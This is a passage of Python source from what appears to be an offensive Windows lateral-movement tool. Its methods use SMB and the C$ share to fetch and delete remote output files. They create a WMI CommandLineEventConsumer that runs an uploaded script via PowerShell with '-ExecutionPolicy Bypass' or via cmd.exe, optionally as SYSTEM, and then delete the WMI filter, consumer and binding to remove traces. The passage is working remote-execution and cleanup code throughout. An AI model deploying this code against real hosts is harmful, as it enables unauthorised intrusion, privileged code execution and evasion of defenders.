                remote_path = f"Users\\Public\\Downloads\\{filename}"
            else:
                # Fallback: use filename only
                filename = file_path.split("\\")[-1]
                remote_path = filename

            # Always use C$ share for Event Consumer output files
            current_share = getattr(self, "share", None)

            if current_share == "C$":
                # Use smblib download with temp file
                import tempfile

                temp_local = tempfile.NamedTemporaryFile(delete=False).name
                self.download(remote_path, temp_local, echo=False)

                # Read the content
                with open(temp_local, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                # Clean up local temp file
                os.unlink(temp_local)
                return content
            else:
                # Use cross-share download to C$ with correct path
                return self._read_file_from_share(remote_path, "C$")

        except Exception as e:
            print_debug(f"Error reading output file via SMB: {e}")
            return None

    def _delete_output_file_smb(self, file_path):
        """Delete output file from remote system using smblib methods"""
        try:
            # Parse the full file path - same logic as read
            if "Users\\" in file_path and "AppData\\Local\\Temp\\" in file_path:
                # Extract the path relative to C$ share: Users\username\AppData\Local\Temp\filename
                if file_path.startswith("C:\\"):
                    remote_path = file_path[3:]  # Remove "C:\" prefix
                else:
                    remote_path = file_path
                print_debug(f"SMB path for deletion: {remote_path}")
            elif file_path.startswith("C:\\Users\\Public\\Downloads\\"):
                # Extract just the filename
                filename = file_path.split("\\")[-1]
                # Use full path in Users\Public\Downloads directory for C$ share
                remote_path = f"Users\\Public\\Downloads\\{filename}"
            else:
                # Fallback: use filename only
                filename = file_path.split("\\")[-1]
                remote_path = filename

            # Always use C$ share for Event Consumer output files
            current_share = getattr(self, "share", None)

            if current_share == "C$":
                # Use smblib delete directly
                self.delete(remote_path)
            else:
                # Use cross-share delete to C$ with correct path
                self._delete_file_from_share(remote_path, "C$")

            print_debug(f"Output file deleted: {file_path}")

        except Exception as e:
            print_debug(f"Error deleting output file: {e}")

    def _cleanup_event_consumer_objects(
        self, iWbemServices, filter_name, consumer_name
    ):
        """Clean up WMI Event Consumer objects to avoid persistence"""

        print_debug("Starting WMI Event Consumer cleanup")

        cleanup_errors = []
        objects_removed = 0

        try:
            # 1. Remove FilterToConsumerBinding first (order is important)
            try:
                # Direct deletion using constructed path
                filter_ref = f'__EventFilter.Name="{filter_name}"'
                consumer_ref = f'CommandLineEventConsumer.Name="{consumer_name}"'
                binding_path = f'__FilterToConsumerBinding.Consumer="{consumer_ref}",Filter="{filter_ref}"'

                iWbemServices.DeleteInstance(binding_path)
                objects_removed += 1
                print_debug("FilterToConsumerBinding removed")
            except Exception as e:
                error_msg = str(e) if str(e) else type(e).__name__
                cleanup_errors.append(f"Binding cleanup: {error_msg}")
                print_debug(f"Binding cleanup failed: {error_msg}")

            # 2. Remove CommandLineEventConsumer
            try:
                consumer_path = f'CommandLineEventConsumer.Name="{consumer_name}"'
                iWbemServices.DeleteInstance(consumer_path)
                objects_removed += 1
                print_debug("CommandLineEventConsumer removed")
            except Exception as e:
                error_msg = str(e) if str(e) else type(e).__name__
                cleanup_errors.append(f"Consumer cleanup: {error_msg}")
                print_debug(f"Consumer cleanup failed: {error_msg}")

            # 3. Remove __EventFilter last
            try:
                filter_path = f'__EventFilter.Name="{filter_name}"'
                iWbemServices.DeleteInstance(filter_path)
                objects_removed += 1
                print_debug("__EventFilter removed")
            except Exception as e:
                error_msg = str(e) if str(e) else type(e).__name__
                cleanup_errors.append(f"Filter cleanup: {error_msg}")
                print_debug(f"Filter cleanup failed: {error_msg}")

            if objects_removed > 0:
                print_debug(
                    f"WMI Event Consumer cleanup: {objects_removed} objects removed"
                )
            else:
                print_warning("WMI Event Consumer cleanup: No objects removed")

            if cleanup_errors:
                print_debug(f"Cleanup errors: {'; '.join(cleanup_errors)}")

        except Exception as e:
            print_warning(f"WMI cleanup failed: {e}")
            print_info("Manual cleanup may be required:")
            print_info(f"  Filter: {filter_name}")
            print_info(f"  Consumer: {consumer_name}")

    def _create_script_consumer(
        self, iWbemServices, consumer_name, script_path, exe_type, system_mode
    ):
        """Create CommandLineEventConsumer to execute uploaded script"""

        # Determine executable path and command line template
        if exe_type == "pwsh":
            executable_path = (
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            )
            # Parse script path for PowerShell execution
            if ":" in script_path and not script_path[1] == ":":
                share_part, file_part = script_path.split(":", 1)
                # Convert C$:path to C:\path for execution
                actual_script_path = f"{share_part[0]}:\\{file_part}"
            else:
                actual_script_path = script_path.replace("/", "\\")
            command_template = f'-ExecutionPolicy Bypass -File "{actual_script_path}"'
        else:
            executable_path = "C:\\Windows\\System32\\cmd.exe"
            # Parse script path for cmd execution
            if ":" in script_path and not script_path[1] == ":":
                share_part, file_part = script_path.split(":", 1)
                # Convert C$:path to C:\path for execution
                actual_script_path = f"{share_part[0]}:\\{file_part}"
            else:
                actual_script_path = script_path.replace("/", "\\")
            command_template = f'/c "{actual_script_path}"'

        print_debug(f"Script Consumer ExecutablePath: {executable_path}")
        print_debug(f"Script Consumer CommandLineTemplate: {command_template}")

        # Create CommandLineEventConsumer
        eventConsumer, _ = iWbemServices.GetObject("CommandLineEventConsumer")
        eventConsumer = eventConsumer.SpawnInstance()

        # Set properties
        eventConsumer.Name = consumer_name
        eventConsumer.ExecutablePath = executable_path
        eventConsumer.CommandLineTemplate = command_template
        eventConsumer.RunInteractively = (
            not system_mode
        )  # Interactive mode unless system flag is set
        eventConsumer.UseDefaultErrorMode = False
        eventConsumer.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        # Create the consumer
        print_debug("Putting Script CommandLineEventConsumer...")
        iWbemServices.PutInstance(eventConsumer.marshalMe())
        print_debug(f"Script CommandLineEventConsumer created: {consumer_name}")

        return consumer_name
